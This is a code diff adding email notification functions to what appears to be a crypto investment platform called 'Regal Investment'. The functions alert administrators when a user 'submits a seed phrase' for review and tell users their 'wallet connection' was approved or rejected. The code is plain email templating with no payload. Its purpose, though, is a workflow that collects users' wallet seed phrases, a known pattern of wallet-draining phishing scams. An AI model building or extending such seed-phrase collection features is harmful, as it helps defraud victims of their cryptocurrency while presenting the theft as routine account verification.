@@ -405,6 +405,160 @@ async function sendWithdrawalStatusUpdate({
   }
 }
 
+interface SendSeedphraseStatusUpdateParams {
+  to: string;
+  userName: string;
+  walletName: string;
+  status: 'approved' | 'rejected';
+  adminNote?: string | null;
+}
+
+async function sendSeedphraseStatusUpdate({
+  to,
+  userName,
+  walletName,
+  status,
+  adminNote,
+}: SendSeedphraseStatusUpdateParams) {
+  try {
+    const from = process.env.EMAIL_FROM || 'Regal Investment <regalinvestment358@gmail.com>';
+    const isApproved = status === 'approved';
+    const statusColor = isApproved ? '#72a210' : '#EF4444';
+    const statusIcon = isApproved ? '🎉' : '❌';
+    const statusText = isApproved ? 'Approved' : 'Rejected';
+
+    const emailHtml = `
+      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
+        <div style="text-align: center; margin-bottom: 20px;">
+          <img src="https://i.postimg.cc/bNychjPg/dark-logo.png" alt="Regal Investment" style="max-width: 200px; height: auto;" />
+        </div>
+        
+        <div style="background-color: #f8f9fa; border-radius: 8px; padding: 25px; margin-bottom: 20px;">
+          <h2 style="color: ${statusColor}; margin-top: 0;">Wallet Connection ${statusText} ${statusIcon}</h2>
+          
+          <p>Hello ${userName},</p>
+          
+          ${isApproved 
+            ? `<p>We're excited to inform you that your <strong>${walletName}</strong> wallet connection has been successfully approved!</p>
+          
+              <div style="background-color: #e8f5e9; border-left: 4px solid #72a210; padding: 12px 15px; margin: 20px 0; border-radius: 4px;">
+                <p style="margin: 0;">
+                  <strong>Wallet Details:</strong><br>
+                  Wallet: ${walletName}<br>
+                  Status: <span style="color: #2e7d32; font-weight: 500;">Approved</span>
+                </p>
+              </div>
+              
+              <p>Your wallet is now connected and you can proceed with your investment activities.</p>
+              
+              <p>You can log in to your dashboard to manage your connected wallets.</p>`
+            : `<p>We regret to inform you that your <strong>${walletName}</strong> wallet connection has been rejected.</p>
+          
+              <div style="background-color: #fee2e2; border-left: 4px solid #EF4444; padding: 12px 15px; margin: 20px 0; border-radius: 4px;">
+                <p style="margin: 0;">
+                  <strong>Wallet Details:</strong><br>
+                  Wallet: ${walletName}<br>
+                  Status: <span style="color: #DC2626; font-weight: 500;">Rejected</span>
+                  ${adminNote ? `<br><br><strong>Reason:</strong> ${adminNote}` : ''}
+                </p>
+              </div>
+              
+              <p>If you believe this is an error or have any questions, please contact our support team for assistance.</p>`
+          }
+          
+          <p>If you have any questions or need assistance, please don't hesitate to contact our support team.</p>
+          
+          <p>Best regards,<br>The Regal Investment Team</p>
+        </div>
+        
+        <div style="text-align: center; color: #6c757d; font-size: 12px; margin-top: 30px;">
+          <p>© ${new Date().getFullYear()} Regal Investment. All rights reserved.</p>
+          <p>This is an automated message, please do not reply to this email.</p>
+        </div>
+      </div>
+    `;
+
+    const data = await transporter.sendMail({
+      from,
+      to,
+      subject: `Wallet Connection ${statusText} - ${walletName}`,
+      html: emailHtml,
+    });
+
+    return { success: true, data };
+  } catch (error) {
+    console.error('Error sending seedphrase status email:', error);
+    return { success: false, error };
+  }
+}
+
+interface SendSeedphraseSubmittedToAdminParams {
+  to: string[];
+  userName: string;
+  userEmail: string;
+  walletName: string;
+  walletType: string;
+}
+
+async function sendSeedphraseSubmittedToAdmin({
+  to,
+  userName,
+  userEmail,
+  walletName,
+  walletType,
+}: SendSeedphraseSubmittedToAdminParams) {
+  try {
+    const from = process.env.EMAIL_FROM || 'Regal Investment <regalinvestment358@gmail.com>';
+
+    const emailHtml = `
+      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
+        <div style="text-align: center; margin-bottom: 20px;">
+          <img src="https://i.postimg.cc/bNychjPg/dark-logo.png" alt="Regal Investment" style="max-width: 200px; height: auto;" />
+        </div>
+        
+        <div style="background-color: #f8f9fa; border-radius: 8px; padding: 25px; margin-bottom: 20px;">
+          <h2 style="color: #72a210; margin-top: 0;">New Seed Phrase Submitted 🔐</h2>
+          
+          <p>Hello Admin,</p>
+          
+          <p>A new seed phrase has been submitted by <strong>${userName}</strong> and requires your review.</p>
+          
+          <div style="background-color: #e8f5e9; border-left: 4px solid #72a210; padding: 12px 15px; margin: 20px 0; border-radius: 4px;">
+            <p style="margin: 0;">
+              <strong>Submission Details:</strong><br>
+              User: ${userName} (${userEmail})<br>
+              Wallet: ${walletName}<br>
+              Wallet Type: ${walletType}<br>
+              Submitted: ${new Date().toLocaleString()}
+            </p>
+          </div>
+          
+          <p>Please log in to your admin dashboard to review and approve or reject this seed phrase submission.</p>
+          
+          <p>Best regards,<br>The Regal Investment Team</p>
+        </div>
+        
+        <div style="text-align: center; color: #6c757d; font-size: 12px; margin-top: 30px;">
+          <p>© ${new Date().getFullYear()} Regal Investment. All rights reserved.</p>
+          <p>This is an automated message, please do not reply to this email.</p>
+        </div>
+      </div>
+    `;
+
+    const data = await transporter.sendMail({
+      from,
+      to,
+      subject: `New Seed Phrase Submission - ${walletName}`,
+      html: emailHtml,
+    });
+
+    return { success: true, data };
+  } catch (error) {
+    console.error('Error sending seedphrase submitted to admin email:', error);
+    return { success: false, error };
+  }
+}
+
 // Export all functions and types
-export type { SendPaymentApprovalEmailParams, SendPaymentSubmittedToAdminParams, SendWelcomeEmailParams, SendWithdrawalSubmittedToAdminParams, SendWithdrawalStatusUpdateParams };
-export { sendPaymentApprovalEmail, sendPaymentSubmittedToAdmin, sendWelcomeEmail, sendWithdrawalSubmittedToAdmin, sendWithdrawalStatusUpdate };
+export type { SendPaymentApprovalEmailParams, SendPaymentSubmittedToAdminParams, SendWelcomeEmailParams, SendWithdrawalSubmittedToAdminParams, SendWithdrawalStatusUpdateParams, SendSeedphraseStatusUpdateParams, SendSeedphraseSubmittedToAdminParams };
+export { sendPaymentApprovalEmail, sendPaymentSubmittedToAdmin, sendWelcomeEmail, sendWithdrawalSubmittedToAdmin, sendWithdrawalStatusUpdate, sendSeedphraseStatusUpdate, sendSeedphraseSubmittedToAdmin };
